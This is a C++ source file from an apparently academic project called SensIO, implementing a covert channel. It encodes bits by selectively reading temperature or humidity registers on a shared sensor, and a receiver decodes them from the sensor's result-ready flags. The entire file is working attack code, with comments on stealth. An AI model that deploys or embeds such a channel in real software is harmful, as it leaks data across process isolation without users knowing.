/**
    SensIO
    ReadFlags.cpp

    Implementation of the "ReadFlags" - Attack. Uses the "result ready" flags from sensors to transmit data.
    For more information see ***

    @author Markus Feldbacher
*/

#include "ReadFlags.h"
#include "AttackHelper.h"
#include "../PacketSystem/ECC/Hadamard.h"
#include "../Sensors/HTS221.h"

ReadFlags::ReadFlags(std::shared_ptr<EDC> edc, std::shared_ptr<SensorBase> sensor) {
    std::shared_ptr<spdlog::logger> log = spd::get("Read Flags");
    _log = log ? log : spd::stdout_color_mt("Read Flags");

    _sens = sensor;
    _edc = edc;

    int sensorcount = _sens->getSensorCount();

    if(sensorcount < 2){
        _log->error("Sensor doesn't provide enough internal sensors for this attack");
        exit(EXIT_FAILURE);
    }

    std::vector<int> regs = _sens->getResultRegisters();
    _reg_T = regs[0];
    _reg_F = regs[1];

    // check if sensor is running
    if(!_sens->isEnabled()){
        _sens->enable(); // not very stealthy. attacker could wait until some normal user enables the sensor
    }
}

int ReadFlags::send(Packet packet) {
    byte_t data[2];
    int ms = _sens->getCycleTime();

    for(int i=0; i<packet.size(); i++) {
        waitForSensReady();
        AttackHelper::waitMs(ms * 0.5); // try to don't interfere with other processes

        // 1
        if (packet[i] != 0) {
            // read tmpout register with autoincrement address
            _log->trace("Send bit 1");
            _sens->readRegister(_reg_T, 1, *data);
        } else {
            // 0
            // read humout
            _log->trace("Send bit 0");
            _sens->readRegister(_reg_F, 1, *data);
        }
    }

    return 0;
}

int ReadFlags::receive(Packet &packet, int scale, bool re_receive) {
    int bit;

    // packet size for normal packets
    size_t packet_bitsize =
            1 + P_DATA_BITS[scale] + P_SQN_BITS + _edc->calcOutputSize(P_DATA_BITS[scale] + P_SQN_BITS + 1);
    _log->debug("Expecting {}bit packet.", packet_bitsize);

    // clean up
    std::vector<bit_t> tmp;
    for (int i = 0; i < packet_bitsize; i++) {

        // Short timeout while receiving, mid timeout while waiting for an answer, long timeout to sync when re-receiving
        int timeout = i==0 ? (re_receive ? TIMEOUT_LONG : TIMEOUT_MID) : TIMEOUT_SHORT;

        bit = readBit(timeout);

        if(bit < 0)
            return bit; // error

        if (bit) {
            if (tmp.empty()) {
                // packet size for command packets
                packet_bitsize = 1 + P_CMD_BITS + P_SQN_BITS + _edc->calcOutputSize(P_CMD_BITS + P_SQN_BITS + 1);
            }

            tmp.push_back(1);
        } else {
            tmp.push_back(0);
        }
    }

    packet.fromBits(tmp, scale);

    return 0;
}


int ReadFlags::waitForSensReady()
{
    std::vector<bool> status_flags;

    _log->trace("Waiting for sensor...");

    do {
        status_flags = _sens->getResultFlags();
        // TODO: if this takes more then a few cycles, check if sensor is active
    } while(!status_flags[0] || !status_flags[1]);


    _log->trace("Ready...");
    return 0;
}

int ReadFlags::request(byte_t req) {
    byte_t data[2];

    Hadamard ecc;
    int had_bitsize = ecc.getEncodedSize(P_SQN_BITS);

    if (had_bitsize < 0) {
        return -1;
    }

    int ms = _sens->getCycleTime();

    _log->debug("Requesting packet: had sqn = 0x{0:2x}", req);

    for (int i = 0; i < had_bitsize; i++) {
        bit_t bit = (bit_t) (req & (1 << (i % 8)));
        waitForSensReady();
        AttackHelper::waitMs(ms * 0.5); // try to don't interfere with other processes

        // 1
        if (bit != 0) {
            // read tmpout register with autoincrement address
            _log->trace("Send bit 1");
            _sens->readRegister(_reg_T, 1, *data);
        } else {
            // 0
            // read humout
            _log->trace("Send bit 0");
            _sens->readRegister(_reg_F, 1, *data);
        }
    }

    return 0;
}

int ReadFlags::waitForRequest(byte_t &sqn_had, bool re_receive, bool initial) {
    int bit;
    Hadamard ecc;
    int had_bitsize = ecc.getEncodedSize(P_SQN_BITS);

    sqn_had = 0;

    int timeout_first = initial ? TIMEOUT_INFTY : (re_receive ? TIMEOUT_LONG : TIMEOUT_MID);

    for (int i = 0; i < had_bitsize; i++) {
        int timeout = i==0 ? timeout_first : TIMEOUT_SHORT;

        bit = readBit(timeout);
        if(bit < 0)
            return bit; // error

        if (bit) {
            sqn_had |= (1 << i);
        }
    }

    _log->debug("Received sqnHad: 0x{0:2x}", sqn_had);

    return 0;
}

void ReadFlags::wait(int cycles) {
    long ms = _sens->getCycleTime();
    AttackHelper::waitMs(ms * cycles);
}

int ReadFlags::readBit(int timeout)
{
    struct timespec start{}, stop{};
    double accum;
    double cycle_delay = _sens->getCycleTime() * 1000000;

    waitForSensReady();

    clock_gettime(CLOCK_REALTIME, &start);

    std::vector<bool> flags = _sens->getResultFlags();

    while(flags[0] && flags[1]) {
        flags = _sens->getResultFlags();

        clock_gettime(CLOCK_REALTIME, &stop);
        accum = stop.tv_nsec - start.tv_nsec;
        // rollover
        if (accum < 0) {
            accum += 1000000000;
        }

        // timeout > delay ms (only relevant in transmission has already started)
        if (timeout != TIMEOUT_INFTY && accum > cycle_delay * timeout) {
            switch (timeout) {
                case TIMEOUT_SHORT:
                    _log->warn("Timeout while receiving");
                    return TIMEOUT_WHILE_RECEIVING;
                case TIMEOUT_MID:
                case TIMEOUT_LONG:
                    _log->warn("Timeout while waiting");
                    return TIMEOUT_WHILE_WAITING;
                default:
                    _log->error("Unexpected Timeout!");
            }
        }
    }

    // hum was read => 0
    if(flags[0] && !flags[1]){
        _log->trace("Received bit: 0");
        return 0;
    }
    // tmp was read => 1
    if(flags[1] && !flags[0]){
        _log->trace("Received bit: 1");
        return 1;
    }
    // error
    _log->warn("Status corrupted. Both flags reset!");
    return -2;
}
